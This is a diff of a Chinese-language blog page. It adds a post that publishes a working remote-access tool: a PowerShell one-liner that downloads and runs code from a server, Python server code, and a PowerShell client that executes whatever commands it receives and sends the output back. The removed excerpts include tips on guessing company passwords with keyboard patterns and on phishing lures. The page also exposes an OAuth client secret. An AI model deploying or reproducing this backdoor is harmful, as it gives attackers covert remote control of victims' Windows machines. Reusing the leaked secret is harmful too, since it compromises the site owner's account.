@@ -4,7 +4,7 @@
 <head>
   <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>Category: 杂谈 | woostundy</title>
+  <title>Python+PowerShell 一句话远控脚本思路 | woostundy</title>
   <meta name="description" content="about woody" />
   <meta name="HandheldFriendly" content="True" />
   <meta name="MobileOptimized" content="320" />
@@ -285,7 +285,7 @@
                 
                 <div id="nav-container">
                     <div class="post-navbar" style="line-height: 63px;display:none">
-                        <li id="navbar-title"><a href="#">undefined</a></li>
+                        <li id="navbar-title"><a href="#">Python+PowerShell 一句话远控脚本思路</a></li>
                         <li id="navbar-toc" style="border-left: none">
                             <a style="padding-right: 15px">
                                 <span id="toc-content" >Introduction</span><i class="fa fa-chevron-down" ></i>
@@ -304,131 +304,203 @@
 
 
 <!-- -->
-<!--<body class="home-template">-->
+<!--<body class="post-template">-->
 <!---->
   
+
 <main class="content" role="main">
+    <article class="post" >
+    <span class="post-meta">
+                  <div class="tag-tile">
+                      
+                      
+                      <a data-pjax href='/tags/python-powershell-hacker/' style='color:#D5D5D5'>python,powershell,hacker</a>
+                      
+                      
+                  </div>
+                <h1 class="post-title" style="margin: 14px 0;color:#50585D">Python+PowerShell 一句话远控脚本思路</h1>
 
-    
-    <article class="post">
+                    <div class="post-meta">
+                        Post on<span class="fa fa-clock-o"></span>
+                        <time datetime="2015-08-26T07:59:26.000Z"
+                              itemprop="datePublished">2015-08-26</time>
+                    </div>
+    </span>
 
-        <header class="post-header">
-            <div class="tag-tile">
-                
-                
-                <a data-pjax href='/tags/局域网/'>局域网</a>
-                
-                
-                <!--<span class="fa fa-bookmark" style="float:right;color:#f39c12"></span>-->
-            </div>
-            <h1 class="post-title"><a data-pjax href="/两个局域网怎么互连 一个简单解决方案/">两个局域网怎么互连？一个简单解决方案</a>
-            </h1>
+        <section class="post-content">
+            <h2 id="简介">简介</h2><p>从Win7开始，Windows全部自带极其强大的Powershell，Windows的新利器！我之后会陆续写一些关于Powershell应用的文章。</p>
+<p>这是用Python写服务端，PowerShell写客户端，基于Socket的一个远控脚本。<br>其实Powershell也可以写服务端，选Python写服务端主要是为了在Linux服务器上也能跑。</p>
+<h2 id="原理">原理</h2><p><code>iex (New-Object Sys.Net.Webclient).DownloadString(&quot;http://IP:Port/connect&quot;)</code> </p>
+<ul>
+<li>用PowerShell上面的命令发Http请求得到客户端代码并用IEX命令执行</li>
+<li>客户端再次与服务端建立TCP链接，执行接收到的代码并返回处理结果</li>
+<li>服务端通过建立连接后收到的第一段数据判断是哪一种请求</li>
+</ul>
+<p>客户端代码完全可以放在Github或者其他Web服务器上，用同一个服务器与端口纯粹是为了快速搭建。</p>
+<h2 id="TODO">TODO</h2><ul>
+<li>客户端增加注册表操作</li>
+<li>优化文件上传下载</li>
+<li>客户端的异常处理</li>
+</ul>
+<h2 id="代码">代码</h2><pre><code><span class="comment"># 这里只发个主要思路，直接用并不靠谱，我后续还改过很多代码。</span>
+<span class="comment"># -*- coding:utf-8 -*-</span>
+<span class="keyword">import</span> sys
+<span class="keyword">import</span> socket
+<span class="keyword">import</span> threading
 
-            <div class="post-meta">
-                Post on<span class="fa fa-clock-o"></span>
-                <time datetime="2016-12-12T12:55:44.000Z"
-                      itemprop="datePublished">2016-12-12</time>
-            </div>
-        </header>
-        <section class="post-excerpt">
-            <p>
-                
-                背景故事这样的：工作室有两条宽带，一条用于同学们日常使用，另一条留给四台服务器专用，两个宽带分别用两个路由器做出口。
-现在有几个同学想要远程连服务器，但不在一个内网很麻烦，如果都放在同一个网络，又不希望服务器专用网络的带宽被占用。
-所以，问题就成了A, B两个局域网怎么在保证wlan出口不变的情况下，让A局域网内的部分机器能直接访问B局域网内的机器。
-开始想过用VPN，但从外网绕进来，怎么也觉得别扭。后来又想俩路由器中间加个交换机，弄个
-                
-            </p>
+<span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:
+    port = int(sys.argv[<span class="number">1</span>])
+<span class="keyword">else</span>:
+    sys.exit(<span class="string">"Usage: server.py &lt;port&gt;"</span>)
+
+allConnections = []
+allAddresses = []
+
+
+<span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span>
+    threadCommand = threading.Thread(target=get_command)
+    threadCommand.start()
+    threadService = threading.Thread(target=service)
+    threadService.start()
+
+
+<span class="comment"># 接受输入参数与控制命令</span>
+<span class="function"><span class="keyword">def</span> <span class="title">get_command</span><span class="params">()</span>:</span>
+    <span class="keyword">while</span> <span class="number">1</span>:
+        command = raw_input(<span class="string">"&gt; "</span>)
+        <span class="keyword">if</span> command == <span class="string">"list"</span>:
+            <span class="keyword">print</span> <span class="string">"pk------------address-----------------port"</span>
+            pk = <span class="number">1</span>
+            <span class="keyword">for</span> i <span class="keyword">in</span> allAddresses:
+                <span class="keyword">print</span> str(pk) + <span class="string">"------"</span> + str(i[<span class="number">0</span>]) + <span class="string">"---------"</span> + str(i[<span class="number">1</span>])
+                pk += <span class="number">1</span>
+        <span class="keyword">elif</span> command.startswith(<span class="string">"c"</span>):
+            <span class="keyword">try</span>:
+                pk = int(command[<span class="number">2</span>:]) - <span class="number">1</span>
+            <span class="keyword">except</span>:
+                <span class="keyword">print</span> <span class="string">"usage:c &lt;client_pk&gt;"</span>
+
+            <span class="keyword">while</span> <span class="number">1</span>:
+                <span class="keyword">try</span>:
+                    msg = raw_input(<span class="string">"control %s:%s&gt; "</span> % (allAddresses[pk][<span class="number">0</span>], allAddresses[pk][<span class="number">1</span>]))
+                    allConnections[pk].send(msg)
+                    allConnections[pk].settimeout(<span class="number">5</span>)
+                    result = allConnections[pk].recv(<span class="number">1024</span>)
+                    result = result.decode(<span class="string">'utf8'</span>)
+                    <span class="keyword">print</span> result
+
+                <span class="keyword">except</span> KeyboardInterrupt:
+                    <span class="keyword">print</span> <span class="string">"Catch C-c"</span>
+                    <span class="keyword">break</span>
+                <span class="keyword">except</span> Exception, e:
+                    <span class="keyword">print</span> <span class="string">"error:"</span> + str(e)
+                    <span class="keyword">break</span>
+
+
+<span class="comment"># Socket服务进程，如果Request里包含connect，用Http返回PowerShell客户端的代码</span>
+<span class="comment"># 如果Request不包含connect，说明是后续的TCP连接成功，添加进已连接的客户端数组</span>
+<span class="function"><span class="keyword">def</span> <span class="title">service</span><span class="params">()</span>:</span>
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind((<span class="string">''</span>, port))
+    sock.listen(<span class="number">5</span>)
+    <span class="keyword">while</span> <span class="number">1</span>:
+        <span class="keyword">try</span>:
+            conn, addr = sock.accept()
+            conn.setblocking(<span class="number">1</span>)
+            <span class="keyword">if</span> conn:
+                request = conn.recv(<span class="number">23</span>)
+            <span class="keyword">print</span> request
+            <span class="keyword">if</span> request.find(<span class="string">"/connect"</span>) &gt; <span class="number">0</span>:
+                http_message(keep_connect(<span class="string">"192.168.199.100"</span>, port), conn)
+            <span class="keyword">else</span>:
+                allConnections.append(conn)
+                allAddresses.append(addr)
+                <span class="keyword">print</span> <span class="string">"Connected with "</span> + addr[<span class="number">0</span>] + <span class="string">":"</span> + str(addr[<span class="number">1</span>])
+        <span class="keyword">except</span> Exception, e:
+            <span class="keyword">print</span> <span class="string">"error:"</span> + str(e)
+            <span class="keyword">break</span>
+
+
+<span class="comment"># PowerShell客户端的代码，与服务端用TCP连接，Iex执行接受的数据并返回执行结果</span>
+<span class="function"><span class="keyword">def</span> <span class="title">keep_connect</span><span class="params">(ip, port)</span>:</span>
+    message = <span class="string">'$client = New-Object System.Net.Sockets.TcpClient("%s",%d)'</span> % (ip, port)
+    message += <span class="string">'''
+                $stream = $client.GetStream()
+                [byte[]]$bytes = 0..65535|%{0}
+                if ($stream.CanWrite)
+                {
+                            $sendBytes = ([text.encoding]::ASCII).GetBytes("rat")
+                            $stream.Write($sendBytes, 0, $sendBytes.Length)
+                            while (1)
+                            {
+                                 try{
+                                     $data = $stream.read($bytes, 0, $bytes.Length)
+                                     $EncodedText = New-Object -TypeName System.Text.UTF8Encoding
+                                     $info = $EncodedText.GetString($bytes,0, $data)
+                                     $sendback = (Invoke-Expression -Command $info 2&gt;&amp;1 | Out-String )
+                                     $sendbackBytes = ([text.encoding]::UTF8).GetBytes($sendback)
+                                     $stream.Write($sendbackBytes,0,$sendbackBytes.Length)
+                                     write($info)
+                                 }
+                                 catch
+                                 {
+                                     Write-Error $_
+                                     continue
+                                 }
+                            }
+                }
+                else
+                {       }
+          '''</span>
+    <span class="keyword">return</span> message
+
+
+<span class="function"><span class="keyword">def</span> <span class="title">http_message</span><span class="params">(msg, conn)</span>:</span>
+    <span class="keyword">try</span>:
+        httpHead = <span class="string">"HTTP/1.1 200 OK\r\n"</span>
+        httpHead += <span class="string">"Content-type: text/html; charset=utf-8\r\n"</span>
+        httpHead += <span class="string">"Connection: Keep-Alive\r\n"</span>
+        httpHead += <span class="string">"Server: test\r\n"</span>
+        httpHead += <span class="string">"Content-Length: %d\r\n"</span> % len(msg)
+        httpHead += <span class="string">"\r\n"</span>
+
+        conn.send(httpHead + msg)
+        <span class="keyword">return</span> <span class="number">1</span>
+    <span class="keyword">except</span>:
+        <span class="keyword">return</span> <span class="number">0</span>
+
+
+main()
+</code></pre>
+        </section>
+        <hr/>
+        <nav class="pagination" style="width:auto" role="pagination">
             
+            <a data-pjax class="newer-posts" href="/深入理解JS笔记 1：数据类型Tips/">← Prev Post</a>
+            
+            <a class="share-button" data-original-title title>Share this Post</a>
+            
+        </nav>
+        <br/>
+        <br/>
+        <section id="comment">
+            <div id="comment-box"></div>
         </section>
     </article>
-    
-    <article class="post">
+    <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+    <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+<script>
+    const gitment = new Gitment({
+    owner: 'woostundy',
+    repo: 'blog_comments',
+    oauth: {
+        client_id: 'e10d1539f77ab82d2d71',
+        client_secret: '4ad39492ae2a09bfcd0e7fd5fc92a5a2180b3719',
+    }
+    })
 
-        <header class="post-header">
-            <div class="tag-tile">
-                
-                
-                <a data-pjax href='/tags/Fishing/'>Fishing</a>
-                
-                
-                <!--<span class="fa fa-bookmark" style="float:right;color:#f39c12"></span>-->
-            </div>
-            <h1 class="post-title"><a data-pjax href="/Some Tips/">Some Tips</a>
-            </h1>
-
-            <div class="post-meta">
-                Post on<span class="fa fa-clock-o"></span>
-                <time datetime="2016-02-24T02:45:37.000Z"
-                      itemprop="datePublished">2016-02-24</time>
-            </div>
-        </header>
-        <section class="post-excerpt">
-            <p>
-                
-                
-超过100人的公司，用键盘走位密码跑一遍，总会有收获。
-Fishing内容：招聘——投递简历 科研——会议邀请 媒体——策划方案 销售——咨询产品 网站——错误反馈
-
-
-                
-            </p>
-            
-        </section>
-    </article>
-    
-    <article class="post">
-
-        <header class="post-header">
-            <div class="tag-tile">
-                
-                
-                <a data-pjax href='/tags/oter/'>oter</a>
-                
-                
-                <!--<span class="fa fa-bookmark" style="float:right;color:#f39c12"></span>-->
-            </div>
-            <h1 class="post-title"><a data-pjax href="/Skill-List/">Skill List</a>
-            </h1>
-
-            <div class="post-meta">
-                Post on<span class="fa fa-clock-o"></span>
-                <time datetime="2015-09-21T06:55:41.000Z"
-                      itemprop="datePublished">2015-09-21</time>
-            </div>
-        </header>
-        <section class="post-excerpt">
-            <p>
-                
-                2016年前该读完
-《Javascript高级编程》
-《Python灰帽子编程》
-《现代操作系统》
-
-要熟练什么
-LinuxBash
-PowerShell
-Python爬虫
-PHP、JS常用操作
-
-接下来做出什么
-维护好博客
-一个靠谱爬虫项目
-保持提交漏洞
-leetcode
-
-
-                
-            </p>
-            
-        </section>
-    </article>
-    
-    <nav class="pagination" role="pagination">
-        
-        <span class="page-number">Page 1 of 1</span>
-        
-    </nav>
+    gitment.render('comment-box')
+</script>
 </main>
 
 
